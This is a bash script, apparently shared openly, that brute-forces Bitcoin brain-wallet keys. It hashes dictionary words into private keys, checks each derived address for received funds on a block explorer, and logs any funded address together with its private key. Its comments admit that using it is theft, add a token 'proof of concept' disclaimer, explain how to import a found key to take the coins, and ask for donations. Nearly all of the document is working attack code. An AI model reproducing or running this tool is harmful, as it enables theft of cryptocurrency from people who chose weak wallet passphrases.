#!/bin/bash

# 0xAF: brute force bitcoin addresses based on dictionary word keys
# if someone were stupid enough to make his private key out of a word... then bye-bye coins
# take a look at these words: 'sausage', 'fuckyou'
# unfortunately this is stealing, so i must say it:
# this script is just a proof of concept, do not steal other people money !
# if you find this script useful, you can always donate something to this address:
# 12XZbCEwwzFbrZ813rZuTESrEjaepxRd3B
#
# if you find a match do this:
# . bitcoin.sh
# newBitcoinKey "0x$(echo -n 'lucky_word' | sha256sum | cut -c -64)"

# get bitcoin.sh from here:
# https://raw.github.com/grondilu/bitcoin-bash-tools/master/bitcoin.sh

# you can prepare your dict file with something like this:
# LC_ALL=C cat test.dict | perl -le 'while (<STDIN>) { chomp;s/\s+/\n/g;print; }' | sort -u -b --parallel=8 > new.dict

source ./bitcoin.sh

bitcoin_check() {
	k=$(echo -n $1 | sha256sum | cut -c -64)
	q=`newBitcoinKey "0x$k" | tail -2 | cut -d ':' -f 2| tr -d ' '`
	z=$(echo $q | cut -d ' ' -f 1)
	p=$(echo $q | cut -d ' ' -f 2)
	x=$(curl http://blockexplorer.com/q/getreceivedbyaddress/$z 2>/dev/null)
	echo "${x/\*/\\\*}" "[$1] http://blockexplorer.com/address/$z [privkey:$p]" | tee -a bitcoin.log
	if [[ "$x" != "0" && "$x" != "ERROR: invalid address" ]]; then
		return 1;
	fi
	return 0;
}

declare -f on_exit
function on_exit()
{
	echo
	echo "last word: $p at line $count"
	echo "$file" > last.session
	echo "$count" >> last.session
	echo "$p" >> last.session
	exit 0;
}

trap on_exit SIGINT
trap on_exit SIGQUIT
trap on_exit SIGTERM

file=$1
WORD=$2

if [[ -e last.session ]]; then
	file=$(head -1 last.session)
	LINE=$(head -2 last.session | tail -1)
	WORD=$(tail -1 last.session)
	echo "Resuming last session from file [$file] with word [$WORD] on line [$LINE]"
fi

if [[ -z $file ]]; then
	echo "error: no file specified (or wrong file in last.session)"
	echo "usage: $0 [dictionary_file] [word_to_continue_from]"
	echo "if 'last.session' file exists, it will be used to continue the last session."
	exit 1
fi

if [[ -n $WORD ]]; then
	cont=1
else
	cont=0
fi

# you can comment this out if the dict is too large
wc=$(wc -l $file | cut -f 1 -d " ")
count=0;
while read p; do
	count=$(( count + 1 ))
	if [[ $cont == 1 ]]; then
		if [[ -n $LINE && $count -gt $LINE ]]; then
			echo "Word [$WORD] was not found on line [$LINE]. Word at [$count] is [$p]. stopping here..."
			exit 1
		fi
		if [[ x"$p" == x"$WORD" ]]; then
			if [[ -n $LINE ]]; then
				if [[ "$LINE" != "$count" ]]; then
					echo "Word [$WORD] found in wrong line [$count], expected it on line [$LINE]. Continuing the search..."
					continue
				fi
				echo "Found word [$WORD] at line $count, starting from here"
				cont=0
			else
				echo "Found word [$WORD] at line $count, starting from here"
				cont=0
			fi
		else
			continue
		fi
	fi

	echo -ne "\r[$count/$wc]"

	x=$(bitcoin_check "$p")
	if [[ $? -gt 0 ]]; then
		echo
		echo $x | tee -a found.log
	fi
done < $file

if [[ $cont == 1 ]]; then
	echo "Never found word [$WORD]. Nothing happened..."
	exit 1
fi

echo
echo DONE
echo
rm -f last.session

